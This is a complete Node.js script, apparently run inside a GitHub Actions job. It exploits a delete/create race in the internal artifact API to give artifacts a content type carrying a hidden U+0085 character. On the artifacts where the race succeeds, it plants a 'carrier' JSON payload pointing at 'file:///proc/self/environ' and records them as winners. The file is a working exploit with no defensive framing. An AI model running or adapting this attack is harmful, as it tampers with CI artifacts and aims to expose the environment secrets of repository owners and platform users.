import {createHash} from 'node:crypto';
import {writeFileSync} from 'node:fs';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const odd = '\u0085application/json';
const placeholder = Buffer.from('{"probe":"delete-race"}');
const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const winners = [];

async function create(name, version) {
  const mimeType = version === 6 ? odd : 'application/json';
  try {
    const value = await client.CreateArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name, version, mimeType: StringValue.create({value: mimeType}),
    });
    return {ok: true, url: value.signedUploadUrl};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 180)};
  }
}

async function upload(url, bytes) {
  if (!url) return false;
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: odd},
  });
  return true;
}

async function finalize(name) {
  try {
    const value = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name, size: String(placeholder.length),
      hash: StringValue.create({value: hash}),
    });
    return {ok: true, id: String(value.artifactId)};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 180)};
  }
}

async function del(name) {
  try {
    const value = await client.DeleteArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    return {ok: Boolean(value.ok)};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 180)};
  }
}

async function inspect(name) {
  try {
    const value = await client.GetSignedArtifactURL({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    return {ok: true, contentType: new URL(value.signedUrl).searchParams.get('rsct')};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 180)};
  }
}

function carrierBytes(repository) {
  return Buffer.from(JSON.stringify({
    full_name: repository,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette delete race carrier',
    stargazers_count: 0,
  }));
}

const modes = ['await-delete', 'overlap-delete-first', 'overlap-create-first'];
const delays = [0, 1, 5, 20, 50, 100, 250, 750];
const profiles = [];
for (const first of [6, 7]) {
  for (const mode of modes) {
    for (const delay of delays) profiles.push({first, mode, delay});
  }
}

async function initial(index) {
  const profile = profiles[index % profiles.length];
  const name = `delrace-${process.env.GITHUB_RUN_ID}-${index}`;
  const first = await create(name, profile.first);
  await upload(first.url, placeholder).catch(() => false);
  const oldFinal = await finalize(name);
  return {index, name, profile, first, oldFinal};
}

async function transition(entry) {
  const {index, name, profile, first, oldFinal} = entry;
  const secondVersion = profile.first === 6 ? 7 : 6;
  let deleted;
  let second;
  if (profile.mode === 'await-delete') {
    deleted = await del(name);
    if (profile.delay) await sleep(profile.delay);
    second = await create(name, secondVersion);
  } else if (profile.mode === 'overlap-delete-first') {
    const deletePromise = del(name);
    if (profile.delay) await sleep(profile.delay);
    const createPromise = create(name, secondVersion);
    [deleted, second] = await Promise.all([deletePromise, createPromise]);
  } else {
    const createPromise = create(name, secondVersion);
    if (profile.delay) await sleep(profile.delay);
    const deletePromise = del(name);
    [second, deleted] = await Promise.all([createPromise, deletePromise]);
  }
  await upload(second.url, placeholder).catch(() => false);
  const final = await finalize(name);
  let view = await inspect(name);
  if (!view.ok) {
    await sleep(200);
    view = await inspect(name);
  }
  const isOdd = view.contentType?.includes('\u0085') ?? false;
  const row = {
    index, profile,
    first: first.ok ? {ok: true} : first,
    oldFinal,
    deleted,
    second: second.ok ? {ok: true} : second,
    final,
    view: view.ok ? {
      ok: true,
      contentType: JSON.stringify(view.contentType).slice(1, -1),
    } : view,
    isOdd,
  };
  const id = final.id || oldFinal.id;
  if (isOdd && id) {
    const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${id}/zip`;
    const placed = await Promise.all(
      [first.url, second.url].map(url => upload(url, carrierBytes(repository)).catch(() => false)),
    );
    row.repository = repository;
    row.carrierPlaced = placed.some(Boolean);
    if (row.carrierPlaced) winners.push({id, name, repository});
  }
  console.log(`DELRACE ${JSON.stringify(row)}`);
  return row;
}

const rows = [];
for (let start = 0; start < 192; start += 48) {
  const prepared = await Promise.all(
    Array.from({length: 48}, (_, offset) => initial(start + offset)),
  );
  rows.push(...await Promise.all(prepared.map(transition)));
}
const summary = {
  total: rows.length,
  odd: rows.filter(row => row.isOdd).length,
  deleted: rows.filter(row => row.deleted?.ok).length,
  secondCreated: rows.filter(row => row.second?.ok).length,
  finalized: rows.filter(row => row.final?.ok).length,
  visible: rows.filter(row => row.view?.ok).length,
};
console.log(`DELRACE_SUMMARY ${JSON.stringify(summary)}`);
writeFileSync('carrier-results.json', JSON.stringify({
  runId: process.env.GITHUB_RUN_ID,
  repository: process.env.GITHUB_REPOSITORY,
  winners,
  summary,
  rows,
}, null, 2) + '\n');
